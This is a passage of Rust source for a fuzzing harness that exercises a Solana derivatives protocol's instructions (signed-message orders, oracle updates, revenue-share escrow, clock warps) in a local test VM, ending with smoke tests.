                feed_id: PriceFeedId(feed_id),
                properties,
            }],
        };
        let mut payload_bytes = Vec::new();
        if payload
            .serialize::<byteorder::LE>(&mut payload_bytes)
            .is_err()
        {
            return false;
        }

        let signature = self.crank.sign_message(&payload_bytes);
        let message = SolanaMessage {
            payload: payload_bytes.clone(),
            signature: signature.as_ref().try_into().unwrap(),
            public_key: self.crank.pubkey().to_bytes(),
        };
        let mut envelope = Vec::new();
        if message.serialize(&mut envelope).is_err() {
            return false;
        }

        let mut args = (envelope.len() as u32).to_le_bytes().to_vec();
        args.extend_from_slice(&envelope);

        let accounts = vec![
            AccountMeta::new(self.crank.pubkey(), true),
            AccountMeta::new_readonly(
                Pubkey::new_from_array(
                    velocity::state::pyth_lazer_oracle::PYTH_LAZER_STORAGE_ID.to_bytes(),
                ),
                false,
            ),
            AccountMeta::new_readonly(instructions_sysvar_id(), false),
            // remaining_accounts: one oracle per feed, in payload order.
            AccountMeta::new(oracle_pda, false),
        ];

        // Envelope offsets: 4-byte magic, then signature/pubkey/size/payload.
        let base = SIGNED_MSG_IX_DATA_OFF + LAZER_MAGIC_LEN;
        let mut ed_data = vec![1u8, 0u8];
        for v in [
            base,
            1u16, // signature is in the velocity ix, which lands at index 1
            base + 64,
            1u16,
            base + 64 + 32 + 2,
            payload_bytes.len() as u16,
            1u16,
        ] {
            ed_data.extend_from_slice(&v.to_le_bytes());
        }

        if self
            .ctx
            .raw_call(Instruction {
                program_id: ed25519_program_id(),
                accounts: vec![],
                data: ed_data,
            })
            .add_transaction()
            .is_err()
        {
            return false;
        }
        if self
            .ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_UPDATE_PYTH_LAZER_ORACLE, &args),
            })
            .signers(&[&self.crank.clone()])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        self.ctx
            .send_batch()
            .map(|o| o.map(|o| o.is_success()).unwrap_or(false))
            .unwrap_or(false)
    }

    /// `update_amm_cache` — the VLP keeper that refreshes cached per-market
    /// oracle/position/fee state.
    ///
    /// Permissionless (any signer), but it needs the injected `AmmCache`; there
    /// is no non-admin instruction that creates one.
    pub fn action_update_amm_cache(&mut self) -> bool {
        let mut accounts = vec![
            AccountMeta::new(self.crank.pubkey(), true),
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(self.amm_cache_pda, false),
            AccountMeta::new_readonly(self.spot_market_pda, false),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_UPDATE_AMM_CACHE, &[]),
            })
            .signers(&[&self.crank.clone()])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `place_signed_msg_taker_order` — the off-chain-signed ("swift") order path.
    ///
    /// Batched as `[ed25519_verify, place_signed_msg_taker_order]` so the
    /// program finds its authenticating precompile at `ix_idx - 1`, which is
    /// the only arrangement it accepts.
    ///
    /// The order must be a *perp taker* order with a worst price, and
    /// its `slot` must be within 500 slots of the clock, so those are pinned
    /// rather than fuzzed — every one of them is an outright rejection, and
    /// leaving them open would spend the whole budget re-deriving that. What
    /// stays fuzzer-driven is the part with real state behind it: direction,
    /// size, and the optional take-profit / stop-loss legs that
    /// place *additional* orders through the same call.
    pub fn action_place_signed_msg_taker_order(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] dir: u8,
        #[range(1..2_000_000_000u64)] base: u64,
        #[range(0..2u8)] with_tp: u8,
        #[range(0..2u8)] with_sl: u8,
        #[range(0..2u8)] with_max_margin_ratio: u8,
        #[range(0..20_000u16)] max_margin_ratio: u16,
        #[range(0..2u8)] slot_backdate: u8,
    ) -> bool {
        use velocity::{
            controller::position::PositionDirection,
            state::{
                order_params::{
                    OrderParams, PostOnlyParam, SignedMsgOrderParamsMessage,
                    SignedMsgTriggerOrderParams,
                },
                user::{MarketType, OrderType},
            },
        };

        let user = self.users[user_idx].clone();
        let direction = if dir == 0 {
            PositionDirection::Long
        } else {
            PositionDirection::Short
        };
        // A worst price 10 percent through the oracle, so the take can fill.
        let worst_price = match direction {
            PositionDirection::Long => 1_100_000u64,
            PositionDirection::Short => 900_000u64,
        };

        let params = OrderParams {
            order_type: OrderType::Market,
            market_type: MarketType::Perp,
            direction,
            base_asset_amount: base,
            price: worst_price,
            market_index: 0,
            post_only: PostOnlyParam::None,
            ..Default::default()
        };

        let clock: anchor_lang::prelude::Clock = self.ctx.svm.get_sysvar();
        // `slot_backdate` reaches the "order slot is too old" guard (>500 slots
        // behind) without making that the only thing this action ever does.
        let order_slot = if slot_backdate == 1 {
            clock.slot.saturating_sub(600)
        } else {
            clock.slot
        };

        self.signed_uuid_seq += 1;
        let uuid = self.signed_uuid_seq.to_le_bytes();

        let trigger = |px: u64| SignedMsgTriggerOrderParams {
            trigger_price: px,
            base_asset_amount: base,
        };
        let message = SignedMsgOrderParamsMessage {
            signed_msg_order_params: params,
            sub_account_id: 0,
            slot: order_slot,
            uuid,
            take_profit_order_params: (with_tp == 1).then(|| trigger(1_200_000)),
            stop_loss_order_params: (with_sl == 1).then(|| trigger(800_000)),
            max_margin_ratio: (with_max_margin_ratio == 1).then_some(max_margin_ratio),
            builder_idx: None,
            builder_fee_tenth_bps: None,
            isolated_position_deposit: None,
            // Unset: the placement then takes the program's own network and
            // routes through the mandatory baseline, which is what this
            // harness drives.
            network: None,
            route: None,
        };
        let mut borsh_message = Vec::new();
        if message.serialize(&mut borsh_message).is_err() {
            return false;
        }
        let envelope = build_signed_msg_envelope(&user.keypair, &borsh_message);

        let mut args = (envelope.len() as u32).to_le_bytes().to_vec();
        args.extend_from_slice(&envelope);
        args.push(0); // is_delegate_signer

        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new(self.signed_msg_orders_pda(&user.keypair.pubkey()), false),
            AccountMeta::new_readonly(self.crank.pubkey(), true),
            AccountMeta::new_readonly(instructions_sysvar_id(), false),
        ];
        accounts.extend(self.market_ras(true));

        // The velocity instruction lands at index 1 (the precompile is at 0), so
        // that is what the ed25519 offsets have to reference.
        let hex_len = (envelope.len() - SIGNED_MSG_PAYLOAD_OFF as usize) as u16;
        if self
            .ctx
            .raw_call(ed25519_verify_ix(1, hex_len))
            .add_transaction()
            .is_err()
        {
            return false;
        }
        if self
            .ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_PLACE_SIGNED_MSG_TAKER_ORDER, &args),
            })
            .signers(&[&self.crank.clone()])
            .add_transaction()
            .is_err()
        {
            return false;
        }
        let ok = self
            .ctx
            .send_batch()
            .map(|o| o.map(|o| o.is_success()).unwrap_or(false))
            .unwrap_or(false);
        if ok {
            // Only a *placed* uuid is worth handing to place_and_make; a failed
            // one would just drive that action into its not-found branch.
            self.signed_uuids
                .push((user_idx, uuid, direction == PositionDirection::Long));
            if self.signed_uuids.len() > 16 {
                self.signed_uuids.remove(0);
            }
        }
        ok
    }

    /// `place_and_make_signed_msg_perp_order` — a maker crossing a signed-msg taker.
    ///
    /// Must be an IOC post-only Limit order (the handler rejects anything else
    /// up front), and the uuid has to name a taker order that is actually
    /// resting in that taker's `SignedMsgUserOrders` ring, so both come from
    /// recorded state rather than from the fuzzer.
    pub fn action_place_and_make_signed_msg(
        &mut self,
        #[range(0..NUM_USERS)] maker_idx: usize,
        #[range(0..16usize)] nth_uuid: usize,
        #[range(1..2_000_000_000u64)] base: u64,
        #[range(0..2u8)] dir: u8,
        #[range(0..2u8)] post_only_sel: u8,
    ) -> bool {
        use velocity::{
            controller::position::PositionDirection,
            state::{
                order_params::{OrderParams, OrderParamsBitFlag, PostOnlyParam},
                user::{MarketType, OrderType},
            },
        };

        if self.signed_uuids.is_empty() {
            return false;
        }
        let (taker_idx, uuid, taker_is_long) =
            self.signed_uuids[nth_uuid % self.signed_uuids.len()];
        if taker_idx == maker_idx {
            return false; // a user cannot make against their own taker order
        }
        let maker = self.users[maker_idx].clone();
        let taker = self.users[taker_idx].clone();

        // The maker MUST take the opposite side of the taker, and must be priced
        // inside the taker's worst price, or `fill_perp_order` finds no cross
        // and the handler returns having done nothing. A taker long accepts up
        // to 1.1M, so a maker ask at 900k crosses.
        //
        // `dir` now only decides whether to deliberately probe the WRONG side,
        // so the no-cross branch stays reachable without being the default.
        let cross = dir == 0;
        let direction = if taker_is_long == cross {
            PositionDirection::Short
        } else {
            PositionDirection::Long
        };
        let price = if taker_is_long {
            900_000u64
        } else {
            1_100_000u64
        };
        let params = OrderParams {
            order_type: OrderType::Limit,
            market_type: MarketType::Perp,
            direction,
            base_asset_amount: base,
            price,
            market_index: 0,
            post_only: if post_only_sel == 0 {
                PostOnlyParam::MustPostOnly
            } else {
                PostOnlyParam::TryPostOnly
            },
            bit_flags: OrderParamsBitFlag::ImmediateOrCancel as u8,
            ..Default::default()
        };
        let mut args = Vec::new();
        if params.serialize(&mut args).is_err() {
            return false;
        }
        args.extend_from_slice(&uuid);

        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(maker.user_pda, false),
            AccountMeta::new(maker.stats_pda, false),
            AccountMeta::new(taker.user_pda, false),
            AccountMeta::new(taker.stats_pda, false),
            AccountMeta::new_readonly(self.signed_msg_orders_pda(&taker.keypair.pubkey()), false),
            AccountMeta::new_readonly(maker.keypair.pubkey(), true),
        ];
        accounts.extend(self.market_ras(true));

        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_PLACE_AND_MAKE_SIGNED_MSG_PERP_ORDER, &args),
            })
            .signers(&[&maker.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `initialize_signed_msg_ws_delegates(Vec<pubkey>)`.
    pub fn action_init_signed_msg_ws_delegates(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..3u32)] n: u32,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let pda = self.signed_msg_ws_pda(&user.keypair.pubkey());
        let mut args = n.to_le_bytes().to_vec(); // borsh Vec length
        for k in 0..n {
            let d = self.users[(user_idx + 1 + k as usize) % NUM_USERS]
                .keypair
                .pubkey();
            args.extend_from_slice(&d.to_bytes());
        }
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new(user.keypair.pubkey(), true),
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INIT_SIGNED_MSG_WS_DELEGATES, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `change_signed_msg_ws_delegate_status(delegate, add)`.
    pub fn action_change_signed_msg_ws_delegate(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] add: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let delegate = self.users[(user_idx + 1) % NUM_USERS].keypair.pubkey();
        let pda = self.signed_msg_ws_pda(&user.keypair.pubkey());
        let mut args = delegate.to_bytes().to_vec();
        args.push((add == 1) as u8);
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new(user.keypair.pubkey(), true),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_CHANGE_SIGNED_MSG_WS_DELEGATE, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `initialize_revenue_share`.
    pub fn action_init_revenue_share(&mut self, #[range(0..NUM_USERS)] user_idx: usize) -> bool {
        let user = self.users[user_idx].clone();
        let pda = self.revenue_share_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), false),
                    AccountMeta::new(user.keypair.pubkey(), true),
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INIT_REVENUE_SHARE, &[]),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `initialize_revenue_share_escrow(num_orders)` — the builder-code escrow.
    pub fn action_init_revenue_share_escrow(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..17u16)] num_orders: u16,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let pda = self.revenue_escrow_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), false),
                    AccountMeta::new(user.stats_pda, false),
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(user.keypair.pubkey(), true),
                    AccountMeta::new_readonly(rent_sysvar_id(), false),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_INIT_REVENUE_SHARE_ESCROW, &num_orders.to_le_bytes()),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `resize_revenue_share_escrow_orders(num_orders)`.
    pub fn action_resize_revenue_share_escrow(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..33u16)] num_orders: u16,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let pda = self.revenue_escrow_pda(&user.keypair.pubkey());
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), false),
                    AccountMeta::new(user.keypair.pubkey(), true),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_RESIZE_REVENUE_SHARE_ESCROW, &num_orders.to_le_bytes()),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `change_approved_builder(builder, max_fee_bps, add)`.
    pub fn action_change_approved_builder(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..10_001u16)] max_fee_bps: u16,
        #[range(0..2u8)] add: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let builder = self.users[(user_idx + 1) % NUM_USERS].keypair.pubkey();
        let pda = self.revenue_escrow_pda(&user.keypair.pubkey());
        let mut args = builder.to_bytes().to_vec();
        args.extend_from_slice(&max_fee_bps.to_le_bytes());
        args.push((add == 1) as u8);
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(pda, false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new(user.keypair.pubkey(), true),
                    AccountMeta::new_readonly(system_program_id(), false),
                ],
                data: ix_data(D_CHANGE_APPROVED_BUILDER, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `update_user_stats_referrer_status` — refreshes the referrer flags on
    /// UserStats.
    pub fn action_update_user_stats_referrer_status(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
    ) -> bool {
        let user = self.users[user_idx].clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new_readonly(user.keypair.pubkey(), true),
                    AccountMeta::new(user.stats_pda, false),
                ],
                data: ix_data(D_UPDATE_USER_STATS_REFERRER_STATUS, &[]),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// Grant/revoke `SpecialUserStatus::VammHedger` on a user (fixture poke).
    ///
    /// `special_transfer_perp_position_to_vamm` refuses any user without this
    /// status (`instructions/user.rs:4353`), and the status is set by a
    /// privileged admin path this harness does not model. Writing it directly
    /// stands in for that admin action, exactly as the oracle poke stands in for
    /// a price publisher — without it the whole vAMM-hedger surface is
    /// unreachable no matter what the fuzzer does.
    pub fn action_set_vamm_hedger(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] grant: u8,
    ) -> bool {
        let pda = self.users[user_idx].user_pda;
        let mut user = match self.read_user(&pda) {
            Some(u) => u,
            None => return false,
        };
        user.special_user_status = if grant == 1 {
            velocity::state::user::SpecialUserStatus::VammHedger as u8
        } else {
            0
        };
        self.ctx.write_zero_copy_account(&pda, &user).is_ok()
    }

    /// `special_transfer_perp_position_to_vamm(market_index, Option<amount>)` —
    /// hands a user's perp exposure back to the vAMM.
    pub fn action_special_transfer_perp_to_vamm(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] with_amount: u8,
        #[range(1..1_000_000_000u64)] amount_mag: u64,
        #[range(0..2u8)] negative: u8,
    ) -> bool {
        // COMPOUND: two preconditions, neither of which the fuzzer reliably
        // supplies together. The handler rejects unless
        // `special_user_status == VammHedger`, and there must be a perp position
        // worth handing back — the census grants the status but leaves the
        // account flat, so the transfer has nothing to move.
        let _ = self.action_set_vamm_hedger(user_idx, 1);
        let _ = self.action_place_and_take_perp_order(user_idx, 0, 10_000_000, 0, 0);
        let user = self.users[user_idx].clone();
        let amount = if negative == 1 {
            -(amount_mag as i64)
        } else {
            amount_mag as i64
        };
        let mut args = 0u16.to_le_bytes().to_vec();
        push_opt(&mut args, with_amount == 1, &amount.to_le_bytes());
        let mut accounts = vec![
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new_readonly(self.state_pda(), false),
        ];
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_SPECIAL_TRANSFER_PERP_TO_VAMM, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// Advance the clock by MONTHS, not seconds.
    ///
    /// A handful of guards are written in units no ordinary warp can reach:
    /// `force_delete_user` requires ~18.1M slots (about three months) of
    /// inactivity, and `reclaim_rent` a thirteen-day account age. `action_warp`
    /// tops out at 5,000 slots, so those branches are unreachable however long
    /// the fuzzer runs — reaching three months 5,000 slots at a time would take
    /// 3,600 consecutive warps in a single iteration.
    ///
    /// Kept separate from `action_warp` rather than widening its range, because
    /// a jump this large restales every oracle and re-prices every time-based
    /// accrual at once; as its own action the fuzzer can learn when that is
    /// useful instead of paying for it on every ordinary time step.
    pub fn action_warp_long(
        &mut self,
        #[range(1..40u64)] months: u64,
        #[range(0..4u8)] repost: u8,
    ) -> bool {
        // ~1 month of 400ms slots.
        self.action_warp(months.saturating_mul(6_480_000), repost)
    }

    /// Advance the clock.
    pub fn action_warp(
        &mut self,
        #[range(1..5_000u64)] slots: u64,
        #[range(0..4u8)] repost: u8,
    ) -> bool {
        let target = self.ctx.slot() + slots;
        self.ctx.warp_to_slot(target);

        // ADVANCE WALL-CLOCK TIME TOO.
        //
        // `LiteSVM::warp_to_slot` sets `clock.slot` and NOTHING else, so
        // `unix_timestamp` sits at its genesis value forever. Every time-gated
        // path in the protocol reads `unix_timestamp`, not the slot: the funding
        // cadence (`now - last_funding_rate_ts >= funding_period`), interest
        // accrual, the IF unstaking cooldown, the revenue settle period, and the
        // TWAP update cadence. Warping slots alone therefore leaves all of them
        // permanently un-triggerable — the harness looked like it was advancing
        // time while the protocol's clock never moved.
        //
        // Mainnet slots are ~400ms, so keep the two coherent rather than letting
        // slot-based staleness and time-based cadences drift apart.
        {
            use anchor_lang::prelude::Clock;
            let mut clock: Clock = self.ctx.svm.get_sysvar();
            clock.slot = target;
            clock.unix_timestamp = clock
                .unix_timestamp
                .saturating_add((slots as i64).saturating_mul(400) / 1000);
            self.ctx.svm.set_sysvar(&clock);
        }

        // REPOST THE ORACLES AT THE NEW SLOT.
        //
        // Staleness is derived purely from `clock_slot - posted_slot`, so
        // warping forward without reposting leaves every oracle stale by exactly
        // the warp distance. That poisons the REST of the iteration: funding,
        // TWAP, settle, margin and liquidation all bail out with "Stale for
        // Margin" before reaching any logic — a single warp used to silently
        // disable most of the harness. In production a keeper posts prices every
        // slot, so repricing on warp is also the realistic behaviour.
        //
        // `repost == 0` (1 in 4 warps) deliberately SKIPS the repost so the
        // staleness/validity branches stay reachable.
        if repost != 0 {
            let price_perp = read_zc::<PythLazerOracle>(&self.ctx, &self.perp_oracle_pda)
                .map(|o| o.price)
                .unwrap_or(PRICE_PRECISION as i64);
            let price_spot = read_zc::<PythLazerOracle>(&self.ctx, &self.spot_1_oracle_pda)
                .map(|o| o.price)
                .unwrap_or(PRICE_PRECISION as i64);
            let seq = self.oracle_seq;
            self.oracle_seq += 2;
            let mut o0 = build_pyth_lazer_oracle(price_perp, 0, target, seq);
            let perp_pda = self.perp_oracle_pda;
            inject(&mut self.ctx, perp_pda, &mut o0);
            let mut o1 = build_pyth_lazer_oracle(price_spot, 0, target, seq + 1);
            let spot_pda = self.spot_1_oracle_pda;
            inject(&mut self.ctx, spot_pda, &mut o1);
        }
        true
    }

    /// Native entrypoint opcode 0 — update_mm_oracle (`[0xFF×4, 0, price, seq]`).
    pub fn action_native_mm_oracle(&mut self, #[range(1..10_000_000i64)] price: i64) -> bool {
        let mut data = vec![0xFF, 0xFF, 0xFF, 0xFF, 0u8];
        data.extend_from_slice(&price.to_le_bytes());
        data.extend_from_slice(&self.mm_seq.to_le_bytes());
        self.mm_seq += 1;
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(self.perp_market_pda, false),
                    AccountMeta::new_readonly(self.crank.pubkey(), true),
                    AccountMeta::new_readonly(clock_sysvar_id(), false),
                    AccountMeta::new_readonly(self.state_pda(), false),
                ],
                data,
            })
            .signers(&[&self.crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// Native entrypoint opcode 1 — update_amm_spread_adjustment
    /// (`[0xFF×4, 1, adj_i8]`).
    pub fn action_native_spread_adjust(&mut self, #[range(-100..100i32)] adj: i32) -> bool {
        let data = vec![0xFF, 0xFF, 0xFF, 0xFF, 1u8, adj as i8 as u8];
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new(self.perp_market_pda, false),
                    AccountMeta::new_readonly(self.crank.pubkey(), true),
                    AccountMeta::new_readonly(self.state_pda(), false),
                ],
                data,
            })
            .signers(&[&self.crank])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }
}

// ---------------------------------------------------------------------------
// Invariants (families I, II, V) — checked after every action.
// ---------------------------------------------------------------------------

/// Read an anchor zero-copy account by **unaligned** copy.
///
/// `TestContext::read_zero_copy_account` uses `bytemuck::from_bytes` (a *reference*
/// cast), which requires the `data[8..]` slice to meet `align_of::<T>()`. Velocity's
/// zero-copy structs contain `u128`/`i128` fields, so on the x86_64 host they have
/// alignment 16, while LiteSVM stores account data in a `Vec<u8>` whose `+8` offset
/// is essentially never 16-aligned — the reference cast then panics
/// (`TargetAlignmentGreaterAndInputNotAligned`). `pod_read_unaligned` copies the
/// bytes out instead, which is correct and alignment-agnostic.
fn read_zc<T: bytemuck::Pod>(ctx: &TestContext, pk: &Pubkey) -> Option<T> {
    let acct = ctx.get_account(pk).ok()?;
    let size = std::mem::size_of::<T>();
    // An account that EXISTS but is too small is a host/on-chain LAYOUT DRIFT
    // (host `size_of::<T>` diverged from the deployed .so). Fail LOUDLY:
    // silently returning None here would skip every invariant that reads through
    // this helper and turn the whole harness green with zero checks executed.
    // Genuinely-absent accounts still return None via the `.ok()?` above.
    assert!(
        acct.data.len() >= 8 + size,
        "layout drift: account {pk} has {} data bytes, need >= {} (8 + size_of::<{}>); \
         rebuild target/deploy/velocity.so from the current program source",
        acct.data.len(),
        8 + size,
        std::any::type_name::<T>(),
    );
    Some(bytemuck::pod_read_unaligned::<T>(&acct.data[8..8 + size]))
}

impl Fixture {
    fn read_spot_market(&self) -> Option<SpotMarket> {
        read_zc::<SpotMarket>(&self.ctx, &self.spot_market_pda)
    }
    fn read_spot_market_1(&self) -> Option<SpotMarket> {
        read_zc::<SpotMarket>(&self.ctx, &self.spot_market_1_pda)
    }
    /// Pool-1 market A = spot market index 2 (mirrors market 0, USDC, 6 decimals).
    fn read_pool1_market_a(&self) -> Option<SpotMarket> {
        read_zc::<SpotMarket>(&self.ctx, &self.pool1_market_a_pda)
    }
    /// Pool-1 market B = spot market index 3 (mirrors market 1, SOL, 9 decimals).
    fn read_pool1_market_b(&self) -> Option<SpotMarket> {
        read_zc::<SpotMarket>(&self.ctx, &self.pool1_market_b_pda)
    }
    fn read_perp_market(&self) -> Option<PerpMarket> {
        read_zc::<PerpMarket>(&self.ctx, &self.perp_market_pda)
    }
    fn read_user(&self, pk: &Pubkey) -> Option<User> {
        read_zc::<User>(&self.ctx, pk)
    }
}

#[cfg(test)]
mod smoke {
    use super::*;

    #[test]
    fn setup_and_deposit_withdraw() {
        let mut f = Fixture::setup();

        // Users initialized?
        for u in &f.users {
            assert!(
                f.read_user(&u.user_pda).is_some(),
                "user account should exist after initialize_user"
            );
        }

        // Deposit must actually succeed against the injected coherent market.
        let vault_before = f.ctx.token_balance(&f.spot_vault_pda);
        let ok = f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0);
        assert!(ok, "deposit should succeed");
        let vault_after = f.ctx.token_balance(&f.spot_vault_pda);
        assert!(
            vault_after > vault_before,
            "vault should grow after deposit: {} -> {}",
            vault_before,
            vault_after
        );

        // Solvency invariant must hold after a real deposit.
        let sm = f.read_spot_market().unwrap();
        velocity::math::spot_withdraw::validate_spot_market_vault_amount(&sm, vault_after)
            .expect("vault solvent after deposit");

        // Withdraw a portion back out.
        let ok = f.action_withdraw(0, 100_000 * QUOTE_PRECISION as u64, 0, 0);
        assert!(ok, "withdraw should succeed");

        // The perp market now has a REAL PythLazer oracle, so order placement is
        // no longer on the hard-coded $1 path. This must still succeed — if it
        // regresses, the oracle account is missing from remaining_accounts or its
        // posted_slot is stale (see Fixture::market_ras).
        assert!(
            f.action_place_perp_order(
                0,          /* user */
                0,          /* long */
                10_000_000, /* base */
                0,          /* Limit */
                1,          /* MustPostOnly */
                0,          /* resting, does not cross */
                1,          /* user_order_id */
                0,          /* not reduce-only */
            ),
            "place_perp_order should succeed against the injected PythLazer oracle"
        );

        // Moving the oracle is a host-side account rewrite; it must always apply
        // and must leave the account readable by the program.
        assert!(
            f.action_move_oracle_price(1, 50, 0, 0, 0),
            "oracle move (+0.50%)"
        );
        let acct = f
            .ctx
            .get_account(&f.perp_oracle_pda)
            .expect("oracle exists");
        assert!(
            acct.data.len() >= 8 + std::mem::size_of::<PythLazerOracle>(),
            "oracle account too small after move: {} bytes",
            acct.data.len()
        );

        // Best-effort: the rest of the surface must not panic (soft-fail is fine —
        // most of these are gated on state this smoke test does not build).
        let _ = f.action_native_mm_oracle(1_000_000);
        let _ = f.action_native_spread_adjust(5);
        let _ = f.action_settle_pnl(0);
        let _ = f.action_warp(100, 1);
        let _ = f.action_cancel_orders(0, 0, 0, 0, 0, 0, 0);
        let _ = f.action_place_orders(0, 2, 0, 10_000_000);
        let _ = f.action_update_user_custom_margin_ratio(0, 2_000);
        let _ = f.action_update_user_margin_trading_enabled(0, 1);
        let _ = f.action_update_user_idle(0, 1, 1, 0);
        let _ = f.action_force_cancel_orders(0, 1, 1);
        let _ = f.action_log_user_balances(0, 1);
        let _ = f.action_place_and_take_perp_order(0, 0, 10_000_000, 0, 0);
        let _ = f.action_place_and_make_perp_order(1, 1, 10_000_000, 1);
        let _ = f.action_fill_perp_order(0, 1, 0, 0, 1);
        let _ = f.action_trigger_order(0, 1, 1);
        let _ = f.action_revert_fill(1);
        let _ = f.action_settle_funding_payment(0);
        let _ = f.action_update_funding_rate(0);
        let _ = f.action_update_perp_bid_ask_twap(0, 1);
        let _ = f.action_update_amms(0, 1);
        let _ = f.action_settle_multiple_pnls(0, 1, 0);
    }

    /// Spot market 1 is the whole point of Tier C: it must be depositable,
    /// borrowable, and its price must be movable — otherwise every spot-liquidation
    /// path stays unreachable no matter how long the fuzzer runs.
    #[test]
    fn spot_market_1_deposit_borrow_and_liquidation_reachable() {
        let mut f = Fixture::setup();

        assert!(
            f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0),
            "deposit market 0"
        );
        assert!(
            f.action_deposit(1, 100 * BASE_PRECISION_U64, 1, 0),
            "deposit market 1"
        );

        let sm1 = f.read_spot_market_1().expect("spot market 1 exists");
        assert!(
            sm1.deposit_balance > 0,
            "market 1 deposit_balance should be nonzero after a deposit"
        );
        assert!(
            f.ctx.token_balance(&f.spot_vault_1_pda) > 0,
            "market 1 vault should hold tokens"
        );

        // Margin trading on, then draw a BORROW of market 1 against quote collateral.
        assert!(
            f.action_update_user_margin_trading_enabled(0, 1),
            "enable margin trading"
        );
        assert!(
            f.action_withdraw(0, 10 * BASE_PRECISION_U64, 1, 0),
            "withdraw/borrow from market 1"
        );
        let sm1 = f.read_spot_market_1().unwrap();
        assert!(
            sm1.borrow_balance > 0,
            "market 1 borrow_balance should be nonzero after a borrow"
        );

        // The oracle must be movable — that is what makes the borrow underwater.
        // Each step is capped under 1%, so a meaningful move is a SEQUENCE of
        // steps; assert the compounding actually walks the price.
        let before = read_zc::<PythLazerOracle>(&f.ctx, &f.spot_1_oracle_pda)
            .expect("market 1 oracle")
            .price;
        for _ in 0..40 {
            assert!(
                f.action_move_spot_1_oracle_price(1, 99, 0, 0, 0),
